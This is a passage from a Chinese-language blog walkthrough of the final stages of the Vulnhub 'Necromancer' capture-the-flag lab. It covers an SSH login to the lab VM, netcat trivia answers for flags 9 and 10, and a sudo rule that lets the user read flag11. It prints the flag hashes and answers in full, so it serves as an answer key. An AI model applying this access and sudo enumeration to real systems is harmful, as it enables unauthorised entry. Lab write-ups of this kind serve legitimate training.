+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ssh demonslayer@10.10.10.102
+</span></span><span class=line><span class=cl>The authenticity of host <span class=s1>&#39;10.10.10.102 (10.10.10.102)&#39;</span> can<span class=s1>&#39;t be established.
+</span></span></span><span class=line><span class=cl><span class=s1>ED25519 key fingerprint is: SHA256:WZAJ9VRjKUurS1xoQ16rOAxPl++K6VW/pSEkaXhnApA
+</span></span></span><span class=line><span class=cl><span class=s1>This key is not known by any other names.
+</span></span></span><span class=line><span class=cl><span class=s1>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span class=line><span class=cl><span class=s1>Warning: Permanently added &#39;</span>10.10.10.102<span class=s1>&#39; (ED25519) to the list of known hosts.
+</span></span></span><span class=line><span class=cl><span class=s1>** WARNING: connection is not using a post-quantum key exchange algorithm.
+</span></span></span><span class=line><span class=cl><span class=s1>** This session may be vulnerable to &#34;store now, decrypt later&#34; attacks.
+</span></span></span><span class=line><span class=cl><span class=s1>** The server may need to be upgraded. See https://openssh.com/pq.html
+</span></span></span><span class=line><span class=cl><span class=s1>demonslayer@10.10.10.102&#39;</span>s password: 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>          .                                                      .
+</span></span><span class=line><span class=cl>        .n                   .                 .                  n.
+</span></span><span class=line><span class=cl>  .   .dP                  dP                   9b                 9b.    .
+</span></span><span class=line><span class=cl> <span class=m>4</span>    qXb         .       dX                     Xb       .        dXp     t
+</span></span><span class=line><span class=cl>dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+</span></span><span class=line><span class=cl>9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+</span></span><span class=line><span class=cl> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+</span></span><span class=line><span class=cl>  <span class=sb>`</span>9XXXXXXXXXXXXXXXXXXXXX<span class=s1>&#39;~   ~`OOO8b   d8OOO&#39;</span>~   ~<span class=sb>`</span>XXXXXXXXXXXXXXXXXXXXXP<span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>    `9XXXXXXXXXXXP&#39;</span> <span class=sb>`</span>9XX<span class=s1>&#39;          `98v8P&#39;</span>          <span class=sb>`</span>XXP<span class=s1>&#39; `9XXXXXXXXXXXP&#39;</span>
+</span></span><span class=line><span class=cl>        ~~~~~~~       9X.          .db<span class=p>|</span>db.          .XP       ~~~~~~~
+</span></span><span class=line><span class=cl>                        <span class=o>)</span>b.  .dbo.dP<span class=s1>&#39;`v&#39;</span><span class=sb>`</span>9b.odb.  .dX<span class=o>(</span>
+</span></span><span class=line><span class=cl>                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+</span></span><span class=line><span class=cl>                     dXXXXXXXXXXXP<span class=s1>&#39;   .   `9XXXXXXXXXXXb
+</span></span></span><span class=line><span class=cl><span class=s1>                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+</span></span></span><span class=line><span class=cl><span class=s1>                    9XXb&#39;</span>   <span class=sb>`</span>XXXXXb.dX<span class=p>|</span>Xb.dXXXXX<span class=s1>&#39;   `dXXP
+</span></span></span><span class=line><span class=cl><span class=s1>                     `&#39;</span>      9XXXXXX<span class=o>(</span>   <span class=o>)</span>XXXXXXP      <span class=sb>`</span><span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>                              XXXX X.`v&#39;</span>.X XXXX
+</span></span><span class=line><span class=cl>                              XP^X<span class=s1>&#39;`b   d&#39;</span><span class=sb>`</span>X^XX
+</span></span><span class=line><span class=cl>                              X. <span class=m>9</span>  <span class=sb>`</span>   <span class=s1>&#39;  P )X
+</span></span></span><span class=line><span class=cl><span class=s1>                              `b  `       &#39;</span>  d<span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>                               `             &#39;</span>                       
+</span></span><span class=line><span class=cl>                               THE NECROMANCER!
+</span></span><span class=line><span class=cl>                                 by  @xerubus
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ 
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ ls -liah<span class=p>;</span>id<span class=p>;</span>pwd<span class=p>;</span>whoami<span class=p>;</span>
+</span></span><span class=line><span class=cl>total <span class=m>40</span>
+</span></span><span class=line><span class=cl><span class=m>16384</span> drwxr-xr-x  <span class=m>3</span> demonslayer  demonslayer   512B Jun <span class=m>23</span>  <span class=m>2016</span> .
+</span></span><span class=line><span class=cl>    <span class=m>2</span> drwxr-xr-x  <span class=m>3</span> root         wheel         512B May <span class=m>11</span>  <span class=m>2016</span> ..
+</span></span><span class=line><span class=cl><span class=m>16387</span> -rw-r--r--  <span class=m>1</span> demonslayer  demonslayer    87B May <span class=m>11</span>  <span class=m>2016</span> .Xdefaults
+</span></span><span class=line><span class=cl><span class=m>16388</span> -rw-r--r--  <span class=m>1</span> demonslayer  demonslayer   773B May <span class=m>11</span>  <span class=m>2016</span> .cshrc
+</span></span><span class=line><span class=cl><span class=m>16389</span> -rw-r--r--  <span class=m>1</span> demonslayer  demonslayer   103B May <span class=m>11</span>  <span class=m>2016</span> .cvsrc
+</span></span><span class=line><span class=cl><span class=m>16390</span> -rw-r--r--  <span class=m>1</span> demonslayer  demonslayer   359B May <span class=m>11</span>  <span class=m>2016</span> .login
+</span></span><span class=line><span class=cl><span class=m>16391</span> -rw-r--r--  <span class=m>1</span> demonslayer  demonslayer   175B May <span class=m>11</span>  <span class=m>2016</span> .mailrc
+</span></span><span class=line><span class=cl><span class=m>16392</span> -rw-r--r--  <span class=m>1</span> demonslayer  demonslayer   218B May <span class=m>11</span>  <span class=m>2016</span> .profile
+</span></span><span class=line><span class=cl><span class=m>16385</span> drwx------  <span class=m>2</span> demonslayer  demonslayer   512B May <span class=m>11</span>  <span class=m>2016</span> .ssh
+</span></span><span class=line><span class=cl><span class=m>16393</span> -rw-r--r--  <span class=m>1</span> demonslayer  demonslayer   706B May <span class=m>11</span>  <span class=m>2016</span> flag8.txt
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>demonslayer<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>demonslayer<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>demonslayer<span class=o>)</span>
+</span></span><span class=line><span class=cl>/home/demonslayer
+</span></span><span class=line><span class=cl>demonslayer
+</span></span><span class=line><span class=cl>$ cat flag8.txt
+</span></span><span class=line><span class=cl>You enter the Necromancer<span class=s1>&#39;s Lair!
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>A stench of decay fills this place.  
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Jars filled with parts of creatures litter the bookshelves.
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>A fire with flames of green burns coldly in the distance.
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Standing in the middle of the room with his back to you is the Necromancer.  
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>In front of him lies a corpse, indistinguishable from any living creature you have seen before.
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>He holds a staff in one hand, and the flickering object in the other.
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>&#34;You are a fool to follow me here!  Do you not know who I am!&#34;
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>The necromancer turns to face you.  Dark words fill the air!
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>&#34;You are damned already my friend.  Now prepare for your own death!&#34; 
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Defend yourself!  Counter attack the Necromancer&#39;</span>s spells at u777!
+</span></span></code></pre></td></tr></table></div></div><h2 id=获取flag9-flag10>获取flag9 flag10</h2><p>这一阶段已经不属于技术利用，而是题目作者设计的知识问答，需要根据 Necromancer 中的文学、奇幻作品和彩蛋回答</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ nc -u localhost <span class=m>777</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>** You only have <span class=m>3</span> hitpoints left! **
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Defend yourself from the Necromancer<span class=err>&#39;</span>s Spells!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Where <span class=k>do</span> the Black Robes practice magic of the Greater Path? 
+</span></span></code></pre></td></tr></table></div></div><p>nc -u 之后回车两次</p><p>问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>** You only have <span class=m>2</span> hitpoints left! **
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Defend yourself from the Necromancer<span class=s1>&#39;s Spells!
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Where do the Black Robes practice magic of the Greater Path?  Kelewan
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>flag8{55a6af2ca3fee9f2fef81d20743bda2c}
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>** You only have 2 hitpoints left! **
+</span></span></span><span class=line><span class=cl><span class=s1>
+</span></span></span><span class=line><span class=cl><span class=s1>Defend yourself from the Necromancer&#39;</span>s Spells!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Who did Johann Faust VIII make a deal with?  Mephistopheles
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag9<span class=o>{</span>713587e17e796209d1df4c9c2c2d2966<span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>** You only have <span class=m>2</span> hitpoints left! **
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Defend yourself from the Necromancer<span class=err>&#39;</span>s Spells!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Who is tricked into passing the Ninth Gate?  Hedge
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag10<span class=o>{</span>8dc6486d2c63cafcdc6efbba2be98ee4<span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>A great flash of light knocks you to the ground<span class=p>;</span> momentarily blinding you!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>As your sight begins to <span class=k>return</span>, you can see a thick black cloud of smoke lingering where the Necromancer once stood.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The room is silent.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You walk over to where the Necromancer once stood.
+</span></span></code></pre></td></tr></table></div></div><p>三个答案分别对应：</p><ol><li>Kelewan<ul><li>问题：Where do the Black Robes practice magic of the Greater Path?</li><li>答案：Kelewan</li><li>这是 Raymond E. Feist 的《Riftwar》系列世界观里的地点。</li><li>**Black Robes（黑袍法师）**属于 Kelewan 的魔法体系。</li><li>Greater Path 是他们所修习的高级魔法道路。</li><li>所以题目实际上是在考你是否认识《Riftwar》世界观。</li></ul></li><li>Mephistopheles<ul><li>问题：Who did Johann Faust VIII make a deal with?</li><li>答案：Mephistopheles</li><li>这里明显是在引用 **浮士德（Faust）**传说。</li><li>Faust 与恶魔 **Mephistopheles（梅菲斯特）**达成交易。</li><li>Johann Faust VIII 是 Necromancer 题目自己构造/引用的名称，但核心就是经典的 Faust 故事。</li></ul></li><li>Hedge<ul><li>问题：Who is tricked into passing the Ninth Gate?</li><li>答案：Hedge</li><li>这是 **The Ninth Gate（第九道门）**相关的设定。</li><li>Hedge 是被欺骗、最终通过 Ninth Gate 的人物。</li><li>这里同样属于题目的文学/神秘学彩蛋，而不是 Linux/SSH 知识。</li></ul></li></ol><h2 id=获取flag11>获取flag11</h2><p>进行提权尝试，目标是flag11</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> demonslayer on thenecromancer:
+</span></span><span class=line><span class=cl>    <span class=nv>env_keep</span><span class=o>+=</span><span class=s2>&#34;FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User demonslayer may run the following commands on thenecromancer:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /bin/cat /root/flag11.txt
+</span></span></code></pre></td></tr></table></div></div><p>可以以 root 权限、无需密码运行 /bin/cat /root/flag11.txt</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>Suddenly you feel dizzy and fall to the ground!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>As you open your eyes you find yourself staring at a computer screen.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Congratulations!!! You have conquered......
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>          .                                                      .
+</span></span><span class=line><span class=cl>        .n                   .                 .                  n.
+</span></span><span class=line><span class=cl>  .   .dP                  dP                   9b                 9b.    .
+</span></span><span class=line><span class=cl> <span class=m>4</span>    qXb         .       dX                     Xb       .        dXp     t
+</span></span><span class=line><span class=cl>dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
+</span></span><span class=line><span class=cl>9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
+</span></span><span class=line><span class=cl> 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
+</span></span><span class=line><span class=cl>  <span class=sb>`</span>9XXXXXXXXXXXXXXXXXXXXX<span class=s1>&#39;~   ~`OOO8b   d8OOO&#39;</span>~   ~<span class=sb>`</span>XXXXXXXXXXXXXXXXXXXXXP<span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>    `9XXXXXXXXXXXP&#39;</span> <span class=sb>`</span>9XX<span class=s1>&#39;          `98v8P&#39;</span>          <span class=sb>`</span>XXP<span class=s1>&#39; `9XXXXXXXXXXXP&#39;</span>
+</span></span><span class=line><span class=cl>        ~~~~~~~       9X.          .db<span class=p>|</span>db.          .XP       ~~~~~~~
+</span></span><span class=line><span class=cl>                        <span class=o>)</span>b.  .dbo.dP<span class=s1>&#39;`v&#39;</span><span class=sb>`</span>9b.odb.  .dX<span class=o>(</span>
+</span></span><span class=line><span class=cl>                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
+</span></span><span class=line><span class=cl>                     dXXXXXXXXXXXP<span class=s1>&#39;   .   `9XXXXXXXXXXXb
+</span></span></span><span class=line><span class=cl><span class=s1>                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
+</span></span></span><span class=line><span class=cl><span class=s1>                    9XXb&#39;</span>   <span class=sb>`</span>XXXXXb.dX<span class=p>|</span>Xb.dXXXXX<span class=s1>&#39;   `dXXP
+</span></span></span><span class=line><span class=cl><span class=s1>                     `&#39;</span>      9XXXXXX<span class=o>(</span>   <span class=o>)</span>XXXXXXP      <span class=sb>`</span><span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>                              XXXX X.`v&#39;</span>.X XXXX
+</span></span><span class=line><span class=cl>                              XP^X<span class=s1>&#39;`b   d&#39;</span><span class=sb>`</span>X^XX
+</span></span><span class=line><span class=cl>                              X. <span class=m>9</span>  <span class=sb>`</span>   <span class=s1>&#39;  P )X
+</span></span></span><span class=line><span class=cl><span class=s1>                              `b  `       &#39;</span>  d<span class=s1>&#39;
+</span></span></span><span class=line><span class=cl><span class=s1>                               `             &#39;</span>                       
+</span></span><span class=line><span class=cl>                               THE NECROMANCER!
+</span></span><span class=line><span class=cl>                                 by  @xerubus
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                   flag11<span class=o>{</span>42c35828545b926e79a36493938ab1b1<span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Big shout out to Dook and Bull <span class=k>for</span> being <span class=nb>test</span> bunnies.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Cheers OJ <span class=k>for</span> the obfuscation help.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Thanks to SecTalks Brisbane and their sponsors <span class=k>for</span> making these CTF challenges possible.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;=========================================&#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;  xerubus (@xerubus) - www.mogozobo.com  &#34;</span>
+</span></span><span class=line><span class=cl><span class=s2>&#34;=========================================&#34;</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里并不是常规意义上的“提权到 root shell”，而是 sudo 明确允许当前用户以 root 身份执行 /bin/cat /root/flag11.txt。由于目标就是读取 flag11，因此无需进一步寻找 root shell</p></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/vulnhub/>Vulnhub</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=4.0.3>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.d00997a2f4a6ce525f496da0c3ae6ad392b0468b8a9024f23309fdfc75c67a35.js defer></script></body></html>
